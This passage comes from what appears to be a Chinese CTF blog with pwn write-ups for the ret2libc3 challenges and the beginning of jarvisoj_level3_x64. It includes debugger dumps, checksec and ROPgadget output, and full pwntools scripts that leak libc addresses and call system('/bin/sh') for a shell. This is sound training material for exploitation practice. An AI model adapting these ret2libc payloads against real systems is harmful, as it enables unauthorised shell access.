[esp], 0x8048721     [0xffffcfe0] =&gt; 0x8048721 ◂— pop ecx /* &#x27;Your message is : %s&#x27; */</span><br><span class="line">   0x8048576 &lt;Print_message+38&gt;    call   printf@plt                  &lt;printf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804857b &lt;Print_message+43&gt;    leave</span><br><span class="line">   0x804857c &lt;Print_message+44&gt;    ret</span><br></pre></td></tr></table></figure>
<p>重点内容是在这段</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line"> ECX  0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EDX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048670 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd028 —▸ 0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]</span><br></pre></td></tr></table></figure>
<p><code>0xffffcff0</code>是dest的位置，<code>0xffffd028</code>是ebp的位置计算出相差位数是56，这里需要+4因为要溢出到返回地址，所以溢出位数是60</p>
<h3 id="攻击脚本-3"><a href="#攻击脚本-3" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">got_puts_address = <span class="string">&quot;134520860&quot;</span></span><br><span class="line">puts_address = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/usr/lib32/libc.so.6&quot;</span>)</span><br><span class="line">elfio = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,got_puts_address)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line"><span class="comment"># DROP的意思是是否丢掉换行符,拿到的是puts在执行环境中的位置，在去本地环境中拿到puts的地址相减，就可以拿到puts在本地环境和运行环境的偏移量</span></span><br><span class="line">put_address_cheap = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">            <span class="string">b&quot;a&quot;</span> * <span class="number">60</span>,</span><br><span class="line">            put_address_cheap+elf.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">            <span class="comment"># 0xdeadbeef,</span></span><br><span class="line">            <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>,</span><br><span class="line">            <span class="built_in">next</span>(elfio.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br><span class="line">        ])</span><br><span class="line"><span class="comment"># elfio.search返回的是一个迭代器，需要用next来一次性都拿到，这里是拿到&quot;sh&quot;字符串的地址</span></span><br><span class="line"><span class="comment"># next(elfio.search(b&quot;sh\x00&quot;))</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>也可以通过下面这个来去做，下面的这个不需要手动去找got表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elfio = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;pod.ctf.wlaq&quot;</span>, <span class="string">&quot;30892&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elfio.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>, <span class="built_in">str</span>(puts_got_addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">60</span>,</span><br><span class="line">        elf.symbols[<span class="string">&quot;system&quot;</span>] + offset,</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">4</span>,</span><br><span class="line">        <span class="built_in">next</span>(elfio.search(<span class="string">b&quot;sh\x00&quot;</span>)),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ret2libc3-search-libc"><a href="#ret2libc3-search-libc" class="headerlink" title="ret2libc3-search_libc"></a>ret2libc3-search_libc</h2><h3 id="题目来源-6"><a href="#题目来源-6" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="文件类型-6"><a href="#文件类型-6" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]</span><br><span class="line">└─$ file ret2libc3 </span><br><span class="line">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>这是一个次啊用动态链接库编译的32位EILF文件</p>
<h3 id="软件防护-4"><a href="#软件防护-4" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]</span><br><span class="line">└─$ checksec ret2libc3 </span><br><span class="line">[*] <span class="string">&#x27;/home/kali/pwn/ret2libc3-libc?/ret2libc3&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
<p>NX是开启的，PIE关闭，这基本就是代表了不能自己写入命令去执行。但是可以拿到对应bss、text、data相关的一些固定信息。</p>
<h3 id="IDA分析-6"><a href="#IDA分析-6" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>简单看了一下，ida中main函数内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405160713.png"><br>然后还有一个<code>secure</code>函数，里面没有有帮助的内容，如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405160748.png"><br>然后ida中还有一个bss buf2可以用，但是那个似乎只能在低版本内核中使用，这里就不考虑了。其他有用信息基本没有。。</p>
<h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>根据ida的内容，主要围绕main函数进行，这里只有一个栈溢出漏洞存在，并且没有system函数和sh字符串可以用，并且这道题目并没有给我们libc库，我们需要通过自己构造执行流，在题目系统中，大概率是开启ASLR的，地址也随即，我们还需要通过自己构造的执行流是心啊反弹地址的一个功能，拿到地址通过特征去libc-database中寻找可能的libc版本，再去确定偏移然后通过偏移找到system的位置，到这一步之后我们还可以通过构造执行流去获取一个<code>sh</code>字符串，或者说是从程序、libc中拿到一个<code>sh</code>字符串。</p>
<h3 id="溢出位数"><a href="#溢出位数" class="headerlink" title="溢出位数"></a>溢出位数</h3><p>使用pwndbg调试，查看位数的位置应该是在gets函数执行过后，内如如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────</span><br><span class="line">*EAX  0xffffd10c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7f9ce14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x235d0c /* <span class="string">&#x27;\x0c]#&#x27;</span> */</span><br><span class="line">*ECX  0xf7f9e8ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486a0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd178 ◂— 0</span><br><span class="line"> ESP  0xffffd0f0 —▸ 0xffffd10c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x804868f (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure>
<p>0xffffd178-0xffffd10c&#x3D;108+4&#x3D;112</p>
<h3 id="攻击脚本-4"><a href="#攻击脚本-4" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">pop_ebp_addr = <span class="number">0x080486FF</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        pop_ebp_addr,</span><br><span class="line">        elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.symbols[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这里干了三件事，首先溢出并且通过puts函数把puts函数真实在内存中的地址输出出来，然后栈平衡一下继续重新运行mian函数。拿到这个地址之后可以通过libcsearch这个库去搜索对应的libc库<br>具体代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&quot;!?&quot;</span>, payload)</span><br><span class="line">libc_start_main_leak = io.recvline()</span><br><span class="line">leak_bytes = libc_start_main_leak[:<span class="number">4</span>]</span><br><span class="line">addr = u32(leak_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>上面的操作是拿到地址之后去libcsearch中搜索对应可能的libc，在ASLR中，他的偏移范围都是按照页的倍数去虚拟化内存地址的，一个页就是<code>4096</code>，4096的16进制是<code>1000</code>，所以后面的三位就不会变化，libcsearch就是通过这个后三位去模糊匹配。运行的时候他会弹出一个选择框，如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405183241.png"><br>这些都是有可能的libc库，但是因为libcsearch好久没有更新了，而且libc都是7年前的了，只有老版本的这种题目可以使用，新版本的libc可以去<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database.git">libc-database</a>项目区查询。最终通过猜到的libc拿到对应的偏移区去尝试工具，因为上面组装的payload继续运行了main，就是说我们还可以继续溢出，再次构建一个payload，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;system&quot;</span>) + offset,</span><br><span class="line">        <span class="number">0xDEADBEEF</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset,</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这里继续溢出了112，因为上面咱们通过<code>pop_ebp_addr</code>栈平衡了一下，所以偏移不会变，后续通过模糊搜索的libc中的system函数+偏移去执行它，后面的参数也是通过libc去查找。<br>完整的攻击脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pod.ctf.wlaq&quot;</span>, <span class="string">&quot;30922&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_addr = <span class="number">0x080486FF</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        pop_ebp_addr,</span><br><span class="line">        elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.symbols[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;!?&quot;</span>, payload)</span><br><span class="line">puts_leak = io.recvline()</span><br><span class="line">leak_bytes = puts_leak[:<span class="number">4</span>]</span><br><span class="line">addr = u32(leak_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;system&quot;</span>) + offset,</span><br><span class="line">        <span class="number">0xDEADBEEF</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>这里要注意的是，如果运行题目的libc版本太高，通过libcsearch估计是做不出来的，得自己通过<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database.git">libc-database</a>项目去找。</p>
<h3 id="CTF-WIKI-EXP分析"><a href="#CTF-WIKI-EXP分析" class="headerlink" title="CTF-WIKI-EXP分析"></a>CTF-WIKI-EXP分析</h3><p>去分析一下ctf-wiki提供的exp，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>主要的区别在于他后面的溢出是104位，原因是因为它第一次溢出构造反弹真实函数地址的时候，他没有进行栈平衡，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br></pre></td></tr></table></figure>
<p>这里他返回地址直接填到了mian，运行完puts直接执行main，当它这个main执行的时候，栈内的数据应该是空的，然后因为函数调用他会把ebp压栈，所以会多一个4的位置，然后继续开辟一个位置为100的s</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">100</span>]</span><br></pre></td></tr></table></figure>
<p>那么esp的位置距离ret就是104，所以第二个payload需要溢出104。</p>
<h2 id="x86-32位-与x64-64位-的区别"><a href="#x86-32位-与x64-64位-的区别" class="headerlink" title="x86(32位)与x64(64位)的区别"></a>x86(32位)与x64(64位)的区别</h2><p>x86的函数传参都是保存在栈上面的，而x64的前六个参数都是存放在寄存器中的，依次为<code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code>中，如果参数大于6个，那么就存放在栈中，然后32位的地址都是占用32个字节(16进制就是4位)，64位的是占用64字节(16位就是8位)，在计算偏移的时候需要注意这一点。</p>
<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><h3 id="题目来源-7"><a href="#题目来源-7" class="headerlink" title="题目来源"></a>题目来源</h3><p>buuctf: <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level3_x64">https://buuoj.cn/challenges#jarvisoj_level3_x64</a><br>PS：这道题目我看教程(星盟培训)是给libc的，然后其实libc这个东西给不给都能做，具体就是通过libcsearch挨个试，后面的脚本会有俩版本，一个有libc的一个没有的。</p>
<h3 id="文件类型-7"><a href="#文件类型-7" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ file attachment</span><br><span class="line">attachment: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped</span><br></pre></td></tr></table></figure>
<p>动态链接库编译的ELF文件</p>
<h3 id="软件防护-5"><a href="#软件防护-5" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ checksec attachment</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/pwn/level9/attachment&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>除了nx基本都关闭。</p>
<h3 id="IDA分析-7"><a href="#IDA分析-7" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要看<code>vulnerable_function</code>，vulnerable_function内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他的基本没啥有用信息，主要有用信息就是一个栈溢出，buf只有128的位置，然后读入了一个<code>0x200</code>的数据。</p>
<h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这题目除了栈溢出漏洞其他有用信息都没有，栈溢出可以控制程序执行流，这种情况应该只能通过got与libc算偏移，拿到system函数地址，通过libc中找<code>sh</code>去设置system函数的参数。找偏移我们需要让他先把当got表的某个函数的地址泄露出来，拿到它运行的真实地址。在他的程序中可以通过write来回显消息，我们也可以通过它去泄露got地址，因为是64位的程序，前6个参数都得放到寄存器中，我们需要通过gadget去看是否可以通过弹栈的方式去设置参数，能用的gadget如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ ROPgadget --binary attachment --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400550 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400499 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
<p>去构造一个泄露got的<code>write</code>指令，具体能用的gadget如下</p>
